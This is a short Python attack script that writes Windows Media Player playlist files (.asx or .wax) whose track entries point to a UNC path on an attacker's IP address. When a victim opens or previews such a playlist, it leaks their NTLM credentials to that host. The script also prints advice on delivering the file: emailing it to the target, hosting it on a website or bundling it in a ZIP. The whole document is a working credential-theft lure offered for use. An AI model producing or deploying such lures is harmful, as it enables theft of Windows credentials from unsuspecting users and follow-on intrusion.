#!/usr/bin/env python3
"""Create Windows Media Player playlist for NTLM leak.

Usage: python3 create_wmp_playlist.py <attacker_ip> <output_file.asx>
"""

import sys

def create_asx_playlist(attacker_ip, output_file):
    """Generate an ASX playlist pointing to attacker UNC path."""
    
    xml_content = f'''<asx version="3.0">
  <title>Music Playlist</title>
  <entry>
    <title>Track 1</title>
    <ref href="file://{attacker_ip}\\\\share\\\\track.mp3" />
  </entry>
</asx>
'''
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(xml_content)
    
    print(f"[+] Created {output_file}")
    print(f"[*] Delivery methods:")
    print(f"    - Email the .asx file to target")
    print(f"    - Place on website and link to it")
    print(f"    - Include in ZIP with other files")
    print(f"[*] Victim must open/preview the playlist to trigger leak")

def create_wax_playlist(attacker_ip, output_file):
    """Generate a WAX (web) playlist."""
    
    xml_content = f'''<asx version="3.0">
  <title>Audio Playlist</title>
  <entry>
    <ref href="file://{attacker_ip}\\\\share\\\\audio.mp3" />
  </entry>
</asx>
'''
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(xml_content)
    
    print(f"[+] Created {output_file}")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 create_wmp_playlist.py <attacker_ip> <output_file.asx>")
        print("Example: python3 create_wmp_playlist.py 10.10.14.2 playlist.asx")
        sys.exit(1)
    
    attacker_ip = sys.argv[1]
    output_file = sys.argv[2]
    
    if output_file.endswith('.wax'):
        create_wax_playlist(attacker_ip, output_file)
    else:
        if not output_file.endswith('.asx'):
            output_file += '.asx'
        create_asx_playlist(attacker_ip, output_file)

if __name__ == '__main__':
    main()
